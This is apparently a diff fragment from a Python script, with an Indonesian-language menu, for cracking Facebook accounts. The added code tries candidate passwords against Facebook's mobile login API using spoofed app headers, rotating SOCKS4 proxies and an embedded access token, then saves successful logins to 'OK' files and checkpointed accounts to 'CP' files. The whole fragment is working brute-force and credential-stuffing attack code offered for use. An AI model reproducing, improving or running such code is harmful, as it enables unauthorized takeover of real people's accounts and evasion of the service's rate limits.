+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		proxff= open('proxy_mat.txt','r').read().splitlines()
+		cuukk=random.choice(proxff)
+		proxs= {'http': 'socks4://'+cuukk}
+		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
+		if "session_key" in response.text and "EAAB" in response.text:
+			print(f"\r{H}*--> {uid}|{pw}")
+			open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
+			ok+=1
+			break
+		elif "www.facebook.com" in response.json()["error_msg"]:
+			print(f"\r{K}*--> {uiz}|{pw}")
+			open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
+			cp+=1
+			break
+		else:
+			continue
+	
+	loop +=1
+
 def crack_followers_pilihan():
 	print("")
-	x=f"\t\t{P2}[01] methode mobile ({H2}slowed cracked{P2})\n\t\t{P2}[02] methode mbasic ({K2}fast cracked{P2})\n\t\t{P2}[03] methode free  ({M2}not recommended {P2})"
+	x=f"{P2}[01] methode mobile  ({H2}slowed cracked{P2})\n{P2}[02] methode mbasic ({K2}fast cracked{P2})\n{P2}[03] methode free  ({M2}not recommended {P2})"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	met = input(garis+" pilih : "+H)
 	if met in ["1","01","a"]:
